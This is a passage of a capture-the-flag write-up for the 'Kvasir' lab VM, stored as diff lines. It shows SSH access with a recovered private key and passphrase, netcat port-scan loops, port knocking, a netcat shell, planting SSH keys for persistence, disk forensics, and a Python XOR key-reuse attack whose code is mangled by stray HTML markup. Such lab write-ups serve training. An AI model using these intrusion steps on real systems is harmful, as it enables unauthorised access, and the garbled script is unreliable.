+oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
+0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
+q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
+cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
+X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
+MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
+gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
+N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
+izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
+Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
+uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
+PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
+RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
+4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
+DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
+JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Awesome, let&rsquo;s use this to connect in as <code>terra</code>.</p>
+
+<pre><code>root@db:~# ssh terra@192.168.3.50 -i terra.id
+Enter passphrase for key 'terra.id':
+</code></pre>
+
+<p>Passphrase? Let&rsquo;s try <code>Nk9yY31hva8q</code> from the QR code.</p>
+
+<pre><code>root@db:~# ssh terra@192.168.3.50 -i terra.id
+Enter passphrase for key 'terra.id': 
+Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Tue Nov  4 17:51:12 2014 from 192.168.3.200
+terra@dev2:~$
+</code></pre>
+
+<p>Aaaand we&rsquo;re in!</p>
+
+<h2>Port knocking </h2>
+
+<p>First thing you notice, there&rsquo;s some mail to read. Let&rsquo;s disregard privacy and see what&rsquo;s in there.</p>
+
+<pre><code>terra@dev2:~$ cat /var/mail/terra 
+Return-path: &lt;locke@192.168.4.100&gt;
+Received: from locke by 192.168.4.100 with local (Exim 4.80)
+~       (envelope-from &lt;locke@adm&gt;)
+~       id 1XHczw-0000V2-8y
+~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100
+
+Date: Wed, 13 Aug 2014 19:10:08 +0100
+To: terra@192.168.3.50
+Subject: Port Knock
+User-Agent: Heirloom mailx 12.5 6/20/10
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Message-Id: &lt;E1XHczw-0000V2-8y@adm&gt;
+From: locke@192.168.4.100
+~
+Hi Terra,
+
+I've been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
+Let me know how it goes.
+
+Regards,
+Locke
+</code></pre>
+
+<p>Okay, looks like port knocking is enabled on <code>locke</code>. But, what&rsquo;s the sequence, what&rsquo;s <code>locke</code>&rsquo;s IP address and what other ports are open?</p>
+
+<p>We can see that <code>terra</code> is dual-homed, so most likely, <code>locke</code> is going to be in 192.168.4.0 subnet.</p>
+
+<pre><code>terra@dev2:~$ /sbin/ifconfig
+eth0      Link encap:Ethernet  HWaddr 16:90:14:17:19:17  
+          inet addr:192.168.3.50  Bcast:192.168.3.255  Mask:255.255.255.0
+          inet6 addr: fe80::1490:14ff:fe17:1917/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:149577 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:162327 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:11573196 (11.0 MiB)  TX bytes:17903327 (17.0 MiB)
+
+eth1      Link encap:Ethernet  HWaddr da:9e:bf:d1:a2:e6  
+          inet addr:192.168.4.50  Bcast:192.168.4.255  Mask:255.255.255.0
+          inet6 addr: fe80::d89e:bfff:fed1:a2e6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:126211 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:97379 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:18689553 (17.8 MiB)  TX bytes:7391653 (7.0 MiB)
+
+(...)
+</code></pre>
+
+<p>First, let&rsquo;s use my homemade scanner to see what IP addresses are in the range.</p>
+
+<pre><code>terra@dev2:~$ for i in {1..254}; do ping -c 1 -w 1 192.168.4.$i | grep "1 received" -B 1; done
+^C
+--- 192.168.4.50 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+--- 192.168.4.100 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+^C
+</code></pre>
+
+<p>Looks like 192.168.4.100 is the one we should be interested in. Let&rsquo;s see what ports are opened.</p>
+
+<pre><code>terra@dev2:~$ for i in {1..65535}; do nc -z 192.168.4.100 $i; if [ $? -eq 0 ]; then echo "Port $i listening" &gt;&gt; results; fi; done
+terra@dev2:~$ cat results 
+Port 22 listening
+</code></pre>
+
+<p>Okay&hellip; port 22 opened, but we don&rsquo;t have a password/key&hellip; maybe port knocking will open more ports? But what&rsquo;s the sequence? Let&rsquo;s try some defaults - maybe 7000, 8000, 9000 (<a href="http://www.zeroflux.org/projects/knock/">knockd</a> defaults).</p>
+
+<pre><code>terra@dev2:~$ nc 192.168.4.100 7000
+(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
+terra@dev2:~$ nc 192.168.4.100 8000
+(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
+terra@dev2:~$ nc 192.168.4.100 9000
+(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
+terra@dev2:~$ for i in {1..65535}; do nc -z 192.168.4.100 $i; if [ $? -eq 0 ]; then echo "Port $i listening" &gt;&gt; results; fi; done
+terra@dev2:~$ cat results 
+Port 22 listening
+Port 1111 listening
+</code></pre>
+
+<p>Ha, awesome! Default sequence seemed to work, now we have another port opened. Let&rsquo;s connect to it.</p>
+
+<pre><code>terra@dev2:~$ nc 192.168.4.100 1111
+whoami
+locke
+</code></pre>
+
+<p>Shell!!!! Quickly generated new keys and dropped them under locke&rsquo;s <code>.ssh</code> dir. Let&rsquo;s connect via normal SSH.</p>
+
+<pre><code>terra@dev2:~$ ssh locke@192.168.4.100 -i keys/locke.id
+Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  4 17:51:13 2014 from 192.168.4.50
+locke@adm:~$
+</code></pre>
+
+<h2>A little bit of forensics</h2>
+
+<p>After some poking around, we can see that this server is not dual-homed (finally!), so I think this could be our final machine!</p>
+
+<p>Also, there&rsquo;s another user - <code>kefka</code>, I guess that&rsquo;s the one we&rsquo;ll need to get our privilege escalation from. But first, we need to get access to that account.</p>
+
+<p>First thing that stands out is <code>note.txt</code> file and <code>diskimage.tar.gz</code>.</p>
+
+<pre><code>locke@adm:~$ cat note.txt 
+Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
+</code></pre>
+
+<p>Cool, let&rsquo;s get diskimage file, extract it and see what it&rsquo;s all about (again, <code>scp</code> it all the way back to our Kali).</p>
+
+<pre><code>root@kali:~# file diskimage 
+diskimage: x86 boot sector, code offset 0x3c, OEM-ID "MSDOS5.0", sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit)
+root@kali:~# mount diskimage /mnt
+root@kali:~# cd /mnt/
+root@kali:/mnt# ls
+total 21
+drwxr-xr-x  2 root root 16384 Jan  1  1970 .
+drwxr-xr-x 22 root root  4096 Oct 12 12:26 ..
+-rwxr-xr-x  1 root root   118 Aug  3 11:10 Secret.rar
+root@kali:/mnt# unrar x Secret.rar 
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+
+Extracting from Secret.rar
+
+Enter password (will not be echoed) for MyPassword.txt: 
+
+Extracting  MyPassword.txt                                            44%
+CRC failed in the encrypted file MyPassword.txt. Corrupt file or wrong password.
+Total errors: 1
+</code></pre>
+
+<p>So I&rsquo;ve mounted the image, but can only see one file that is encrypted! And again, I don&rsquo;t have a password. Ahhh, did I miss something on the way? What made me suspicious though was the size of the diskimage file, it&rsquo;s like 60MB, while <code>Secret.rar</code> is merely a hundred bytes. There must be something else!</p>
+
+<p>I reached out to a simple, extremely useful tool for extracting data from images - <code>foremost</code>. It&rsquo;ll extract all the files it can find (even deleted ones) from a provided image. Let&rsquo;s have a look what we can get here.</p>
+
+<pre><code>root@kali:~# foremost -i diskimage 
+Processing: diskimage
+|*|
+root@kali:~# cd output/
+root@kali:~/output# ls
+total 20
+drwxr-xr--  4 root root 4096 Nov  6 11:50 .
+drwxr-xr-x 27 root root 4096 Nov  6 11:50 ..
+-rw-r--r--  1 root root  729 Nov  6 11:50 audit.txt
+drwxr-xr--  2 root root 4096 Nov  6 11:50 rar
+drwxr-xr--  2 root root 4096 Nov  6 11:50 wav
+root@kali:~/output# cd wav/
+root@kali:~/output/wav# ls
+total 440
+drwxr-xr-- 2 root root   4096 Nov  6 11:50 .
+drwxr-xr-- 4 root root   4096 Nov  6 11:50 ..
+-rw-r--r-- 1 root root 440480 Nov  6 11:50 00000514.wav
+</code></pre>
+
+<p>Cool, we found a wav file!</p>
+
+<p>Unfortunately, it doesn&rsquo;t sound like anything useful at all&hellip; <code>strings</code> didn&rsquo;t return anything useful on it either. I did a bit of a research into hiding data in wav files, but there is variety of different tools and yet no hints about which one may have been used. But then got that idea&hellip; let&rsquo;s see &ldquo;how does the sound look like&rdquo;.</p>
+
+<p>I&rsquo;ve downloaded <a href="http://www.sonicvisualiser.org/index.html">SonicVisualiser</a> and opened up spectogram of the wav file.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/spectogram.png" title="Spectogram" alt="Spectogram" /></p>
+
+<p>Whoop, whoop! That&rsquo;s our password to the rar!</p>
+
+<pre><code>root@kali:~/output/rar# unrar x 00000512.rar 
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+
+Extracting from 00000512.rar
+
+Enter password (will not be echoed) for MyPassword.txt: 
+
+Extracting  MyPassword.txt                                            OK 
+All OK
+root@kali:~/output/rar# cat MyPassword.txt 
+5224XbG5ki2C
+</code></pre>
+
+<h2>Key reuse</h2>
+
+<p>Using found password <code>5224XbG5ki2C</code> we can log-in as <code>kefka</code>.</p>
+
+<pre><code>locke@adm:~$ su - kefka
+Password: 
+kefka@adm:~$ sudo -l
+Matching Defaults entries for kefka on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kefka may run the following commands on this host:
+    (ALL) NOPASSWD: /opt/wep2.py
+</code></pre>
+
+<p>And quickly see that we&rsquo;ll need to do our privilege escalation via <code>/opt/wep2.py</code> script.</p>
+
+<p>So what does it actually do? It opens up local port 1234 and listens for connections. When you connect to it, it offers to provide you an encrypted flag and also encrypts input of your choice.</p>
+
+<pre><code>kefka@adm:~$ sudo /opt/wep2.py &amp;
+[1] 2817
+kefka@adm:~$ nc localhost 1234
+=============================
+Can you retrieve my secret..?
+=============================
+
+Usage:
+'V' to view the encrypted flag
+'E' to encrypt a plaintext string (e.g. 'E AAAA')
+
+V
+1e6115:09f6e8ef07010490172cdbb2
+V
+a54afe:9c82be3f9bdecf8e426c91d8
+V
+4c1261:57630397f8dbad94c02c0a45
+E A
+853283:cd
+E A
+acfd3c:93
+</code></pre>
+
+<p>Quickly we can observe couple things:</p>
+
+<ul>
+<li>encrypted text is always different</li>
+<li>different keys are used each time (hence the above)</li>
+<li>output strings are hex representations of encoded string</li>
+<li>used key is pretty small</li>
+</ul>
+
+
+<p>Also, name of the script suggests WEP encryption&hellip; or at least that it&rsquo;s as bad as WEP :)</p>
+
+<p>After a bit of research, we can craft our attack using key reuse. Few words on how it works.</p>
+
+<p>Because of the way XOR works, some weak ciphers are vunerable to key reuse attack if the same key is reused. As long as you know the plaintext of one encrypted message and it&rsquo;s key, if you find another, unknown message encoded with the same key, you will be able to extract its plaintext. Let&rsquo;s look at the following:</p>
+
+<p> <code>encrypted_messageA</code> = <code>messageA</code> XOR <code>key</code></p>
+
+<p> <code>encrypted_messageB</code> = <code>messageB</code> XOR <code>key</code></p>
+
+<p>What happens if we XOR both of them together? Remember that <code>abc XOR abc = 0</code>!</p>
+
+<p> <code>encrypted_messageA XOR encrypted_messageB = messageA XOR key XOR messageB XOR key = messageA XOR messageB</code></p>
+
+<p>Keys disappeared, because <code>key XOR key = 0</code>.</p>
+
+<p>Now assume we know plaintext of <code>messageA</code> and want to find <code>messageB</code>. All we need to do is get rid of known <code>messageA</code> from the equation by XORing the whole thing with <code>messageA</code>.</p>
+
+<p> <code>messageA XOR messageB XOR messageA = messageB</code></p>
+
+<p>Again, because <code>messageA XOR messageA = 0</code>.</p>
+
+<p><em>Some really good resources that helped me with understanding the concept:</em></p>
+
+<ul>
+<li><a href="http://b.cryptosmith.com/2008/05/31/stream-reuse/">http://b.cryptosmith.com/2008/05/31/stream-reuse/</a></li>
+<li><a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">http://en.wikipedia.org/wiki/Stream_cipher_attack</a></li>
+</ul>
+
+
+<p>So, knowing what needs to be done, I&rsquo;ve crafted below script to quickly get our plaintext flag.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">XOR</span> <span class="n">strings</span> <span class="n">function</span> <span class="n">definition</span> <span class="p">(</span><span class="n">ensure</span> <span class="n">to</span> <span class="k">pass</span> <span class="ow">in</span> <span class="n">binary</span> <span class="n">values</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">xor_strings</span><span class="p">(</span><span class="n">p_string1</span><span class="p">,</span> <span class="n">p_string2</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">return</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">y</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">p_string1</span><span class="p">,</span> <span class="n">p_string2</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Initialise</span> <span class="n">socket</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">1234</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Get</span> <span class="n">banner</span> <span class="ow">and</span> <span class="n">instructions</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Random</span><span class="p">,</span> <span class="n">known</span> <span class="n">message</span> <span class="n">of</span> <span class="n">the</span> <span class="n">same</span> <span class="n">length</span> <span class="k">as</span> <span class="n">the</span> <span class="n">flag</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">to</span> <span class="n">be</span> <span class="n">used</span> <span class="n">later</span> <span class="k">for</span> <span class="n">XOR</span> <span class="n">operations</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">message</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">12</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Collections</span> <span class="n">of</span> <span class="n">encrypted</span> <span class="n">flags</span> <span class="ow">and</span> <span class="n">messages</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="p">{}</span>
+</span><span class='line'><span class="n">messages</span> <span class="o">=</span> <span class="p">{}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>    <span class="c"># Build a list of known encrypted flags</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'>    <span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">flag_key</span> <span class="o">=</span> <span class="n">encrypted_flag</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
+</span><span class='line'>    <span class="n">flag_value</span> <span class="o">=</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
+</span><span class='line'>    <span class="n">flags</span><span class="p">[</span><span class="n">flag_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">flag_value</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># Build a list of known encrypted messages</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;E &quot;</span> <span class="o">+</span> <span class="n">message</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">encrypted_message</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'><span class="n">message_key</span> <span class="o">=</span> <span class="n">encrypted_message</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
+</span><span class='line'><span class="n">message_value</span> <span class="o">=</span> <span class="n">encrypted_message</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
+</span><span class='line'><span class="n">messages</span><span class="p">[</span><span class="n">message_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">message_value</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Find the flag key in message keys or vice versa</span>
+</span><span class='line'><span class="c"># (since we&#39;re building 2 lists, check both - should</span>
+</span><span class='line'><span class="c"># be able to find a match quicker)</span>
+</span><span class='line'><span class="k">if</span> <span class="n">flag_key</span> <span class="ow">in</span> <span class="n">messages</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">message_value</span> <span class="o">=</span> <span class="n">messages</span><span class="p">[</span><span class="n">flag_key</span><span class="p">]</span>
+</span><span class='line'>    <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">message_key</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">flag_value</span> <span class="o">=</span> <span class="n">flags</span><span class="p">[</span><span class="n">message_key</span><span class="p">]</span>
+</span><span class='line'>    <span class="k">break</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Values</span> <span class="n">are</span> <span class="n">returned</span> <span class="ow">in</span> <span class="nb">hex</span> <span class="n">form</span><span class="p">,</span> <span class="n">so</span> <span class="n">need</span> <span class="n">to</span> <span class="n">convert</span> <span class="n">it</span> <span class="n">back</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">to</span> <span class="n">binary</span> <span class="k">for</span> <span class="n">XOR</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">binary_message</span> <span class="o">=</span> <span class="n">message_value</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nb">hex</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'><span class="n">binary_flag</span> <span class="o">=</span> <span class="n">flag_value</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nb">hex</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">XOR</span> <span class="n">both</span> <span class="n">encryptions</span> <span class="n">together</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">encrypted_message</span> <span class="n">XOR</span> <span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">message</span> <span class="n">XOR</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">flag</span> <span class="n">XOR</span> <span class="n">key</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">xor_both_result</span> <span class="o">=</span> <span class="n">xor_strings</span><span class="p">(</span><span class="n">binary_message</span><span class="p">,</span> <span class="n">binary_flag</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">XOR</span> <span class="n">above</span> <span class="n">rsult</span> <span class="k">with</span> <span class="n">plaintext</span> <span class="n">message</span> <span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span><span class="p">,</span> <span class="n">because</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
